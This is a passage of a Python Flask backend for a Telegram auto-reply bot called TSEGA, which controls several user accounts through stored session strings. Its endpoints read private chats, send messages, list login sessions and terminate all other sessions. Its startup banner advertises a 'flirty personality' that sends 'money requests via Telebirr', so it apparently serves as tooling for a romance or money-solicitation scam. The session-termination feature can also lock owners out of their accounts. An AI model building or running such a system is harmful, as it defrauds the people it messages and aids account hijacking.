            return jsonify({'success': False, 'error': 'Not authorized'})
        
        dialogs = loop.run_until_complete(client.get_dialogs())
        
        chats = []
        messages = []
        
        for dialog in dialogs:
            if dialog.is_user and not dialog.entity.bot:
                chat = {
                    'id': str(dialog.id),
                    'title': dialog.name or f"User {dialog.id}",
                    'type': 'user',
                    'lastMessage': dialog.message.text[:100] if dialog.message and dialog.message.text else 'No messages',
                    'lastMessageDate': dialog.message.date.timestamp() if dialog.message else None,
                    'unread': dialog.unread_count
                }
                chats.append(chat)
                
                # Get last 20 messages for this chat
                if dialog.message:
                    messages.append({
                        'chatId': str(dialog.id),
                        'text': dialog.message.text,
                        'date': dialog.message.date.timestamp(),
                        'out': dialog.message.out,
                        'id': dialog.message.id,
                        'hasMedia': bool(dialog.message.media)
                    })
        
        loop.run_until_complete(client.disconnect())
        loop.close()
        
        return jsonify({
            'success': True,
            'chats': chats,
            'messages': messages
        })
        
    except Exception as e:
        logger.error(f"Error: {e}")
        if "auth_key_unregistered" in str(e):
            return jsonify({'success': False, 'error': 'auth_key_unregistered'})
        return jsonify({'success': False, 'error': str(e)})

# API: Send message
@app.route('/api/send-message', methods=['POST'])
def send_message():
    data = request.json
    account_id = data.get('accountId')
    chat_id = data.get('chatId')
    message = data.get('message')
    
    if not account_id or not chat_id or not message:
        return jsonify({'success': False, 'error': 'Missing required fields'})
    
    account = next((a for a in accounts if a['id'] == account_id), None)
    if not account:
        return jsonify({'success': False, 'error': 'Account not found'})
    
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        client = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
        loop.run_until_complete(client.connect())
        
        if not loop.run_until_complete(client.is_user_authorized()):
            return jsonify({'success': False, 'error': 'Not authorized'})
        
        # Convert chat_id to integer if it's a string of digits
        try:
            if isinstance(chat_id, str) and chat_id.lstrip('-').isdigit():
                chat_id = int(chat_id)
        except:
            pass
        
        # Send the message
        result = loop.run_until_complete(client.send_message(chat_id, message))
        
        loop.run_until_complete(client.disconnect())
        loop.close()
        
        return jsonify({
            'success': True,
            'message': 'Message sent',
            'message_id': result.id
        })
        
    except Exception as e:
        logger.error(f"Error sending message: {e}")
        return jsonify({'success': False, 'error': str(e)})

# API: Get active sessions
@app.route('/api/get-sessions', methods=['POST'])
def get_sessions():
    data = request.json
    account_id = data.get('accountId')
    
    if not account_id:
        return jsonify({'success': False, 'error': 'Account ID required'})
    
    account = next((a for a in accounts if a['id'] == account_id), None)
    if not account:
        return jsonify({'success': False, 'error': 'Account not found'})
    
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        client = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
        loop.run_until_complete(client.connect())
        
        if not loop.run_until_complete(client.is_user_authorized()):
            return jsonify({'success': False, 'error': 'Not authorized'})
        
        auths = loop.run_until_complete(client(GetAuthorizationsRequest()))
        
        sessions = []
        for auth in auths.authorizations:
            session = {
                'hash': auth.hash,
                'device_model': auth.device_model,
                'platform': auth.platform,
                'system_version': auth.system_version,
                'api_id': auth.api_id,
                'app_name': auth.app_name,
                'app_version': auth.app_version,
                'date_created': auth.date_created,
                'date_active': auth.date_active,
                'ip': auth.ip,
                'country': auth.country,
                'region': auth.region,
                'current': auth.current
            }
            sessions.append(session)
        
        loop.run_until_complete(client.disconnect())
        loop.close()
        
        current_hash = None
        for s in sessions:
            if s['current']:
                current_hash = s['hash']
                break
        
        return jsonify({
            'success': True,
            'sessions': sessions,
            'current_hash': current_hash
        })
        
    except Exception as e:
        logger.error(f"Error: {e}")
        if "FRESH_RESET_FORBIDDEN" in str(e):
            return jsonify({'success': False, 'error': 'fresh_reset_forbidden'})
        return jsonify({'success': False, 'error': str(e)})

# API: Terminate session
@app.route('/api/terminate-session', methods=['POST'])
def terminate_session():
    data = request.json
    account_id = data.get('accountId')
    hash_value = data.get('hash')
    
    if not account_id or not hash_value:
        return jsonify({'success': False, 'error': 'Account ID and session hash required'})
    
    account = next((a for a in accounts if a['id'] == account_id), None)
    if not account:
        return jsonify({'success': False, 'error': 'Account not found'})
    
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        client = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
        loop.run_until_complete(client.connect())
        
        if not loop.run_until_complete(client.is_user_authorized()):
            return jsonify({'success': False, 'error': 'Not authorized'})
        
        loop.run_until_complete(client(ResetAuthorizationRequest(hash_value)))
        
        loop.run_until_complete(client.disconnect())
        loop.close()
        
        return jsonify({'success': True, 'message': 'Session terminated'})
        
    except Exception as e:
        logger.error(f"Error: {e}")
        return jsonify({'success': False, 'error': str(e)})

# API: Terminate all other sessions
@app.route('/api/terminate-sessions', methods=['POST'])
def terminate_all_sessions():
    data = request.json
    account_id = data.get('accountId')
    
    if not account_id:
        return jsonify({'success': False, 'error': 'Account ID required'})
    
    account = next((a for a in accounts if a['id'] == account_id), None)
    if not account:
        return jsonify({'success': False, 'error': 'Account not found'})
    
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        client = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
        loop.run_until_complete(client.connect())
        
        if not loop.run_until_complete(client.is_user_authorized()):
            return jsonify({'success': False, 'error': 'Not authorized'})
        
        auths = loop.run_until_complete(client(GetAuthorizationsRequest()))
        
        terminated = 0
        for auth in auths.authorizations:
            if not auth.current:
                try:
                    loop.run_until_complete(client(ResetAuthorizationRequest(auth.hash)))
                    terminated += 1
                except:
                    pass
        
        loop.run_until_complete(client.disconnect())
        loop.close()
        
        return jsonify({
            'success': True, 
            'message': f'Terminated {terminated} other sessions'
        })
        
    except Exception as e:
        logger.error(f"Error: {e}")
        return jsonify({'success': False, 'error': str(e)})

# API: Get conversation history
@app.route('/api/conversation-history', methods=['GET'])
def get_conversation_history():
    account_id = request.args.get('accountId')
    chat_id = request.args.get('chatId')
    
    if not account_id or not chat_id:
        return jsonify({'success': False, 'error': 'Account ID and Chat ID required'})
    
    account_key = str(account_id)
    
    history = []
    if account_key in conversation_history and chat_id in conversation_history[account_key]:
        history = conversation_history[account_key][chat_id]
    
    return jsonify({
        'success': True,
        'history': history
    })

# API: Clear conversation history
@app.route('/api/clear-history', methods=['POST'])
def clear_history():
    data = request.json
    account_id = data.get('accountId')
    chat_id = data.get('chatId')
    
    if not account_id or not chat_id:
        return jsonify({'success': False, 'error': 'Account ID and Chat ID required'})
    
    account_key = str(account_id)
    
    if account_key in conversation_history and chat_id in conversation_history[account_key]:
        conversation_history[account_key][chat_id] = []
        save_conversation_history()
    
    return jsonify({'success': True})

# API: Health check
@app.route('/api/health', methods=['GET'])
def health():
    return jsonify({
        'status': 'healthy',
        'accounts': len(accounts),
        'active_clients': len(active_clients),
        'timestamp': time.time()
    })

# API: Test Telegram connection
@app.route('/api/test-telegram', methods=['GET'])
def test_telegram_connection():
    results = {
        'api_id': API_ID,
        'api_id_valid': False,
        'connection': False,
        'errors': []
    }
    
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        client = TelegramClient(StringSession(), API_ID, API_HASH, timeout=10)
        connected = loop.run_until_complete(client.connect())
        
        if connected:
            results['connection'] = True
            results['api_id_valid'] = True
        
        loop.run_until_complete(client.disconnect())
        loop.close()
        
        return jsonify({
            'success': True,
            'results': results
        })
        
    except Exception as e:
        return jsonify({
            'success': False,
            'error': str(e),
            'results': results
        })

# ==================== KEEP ALIVE ====================

def keep_alive():
    """Keep Render from sleeping"""
    app_url = os.environ.get('RENDER_EXTERNAL_URL', 'http://localhost:5000')
    
    while True:
        try:
            requests.get(f"{app_url}/api/health", timeout=10)
            logger.info(f"🔋 Keep-alive ping sent")
        except Exception as e:
            logger.error(f"Keep-alive error: {e}")
        
        time.sleep(240)

# ==================== STARTUP ====================

def start_auto_reply_thread():
    """Start auto-reply in background"""
    time.sleep(5)
    logger.info("Starting auto-reply for enabled accounts...")
    start_all_auto_replies()

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    
    print('\n' + '='*70)
    print('🤖 TSEGA - TELEGRAM AUTO-REPLY BOT')
    print('='*70)
    print(f'✅ Port: {port}')
    print(f'✅ Accounts loaded: {len(accounts)}')
    print('='*70)
    
    for acc in accounts:
        status = "ENABLED" if str(acc['id']) in reply_settings and reply_settings[str(acc['id'])].get('enabled') else "DISABLED"
        print(f'   • {acc.get("name")} ({acc.get("phone")}) - {status}')
    
    print('='*70)
    print('🚀 FEATURES:')
    print('   • Auto-reply to private messages')
    print('   • Intent detection (meet, libdash, enibada, etc.)')
    print('   • Money requests via Telebirr')
    print('   • Flirty personality with emojis')
    print('   • Conversation history tracking')
    print('='*70 + '\n')
    
    # Start keep-alive thread
    threading.Thread(target=keep_alive, daemon=True).start()
    
    # Start auto-reply thread
    threading.Thread(target=start_auto_reply_thread, daemon=True).start()
    
    # Run Flask app
    app.run(host='0.0.0.0', port=port, debug=False, threaded=True)
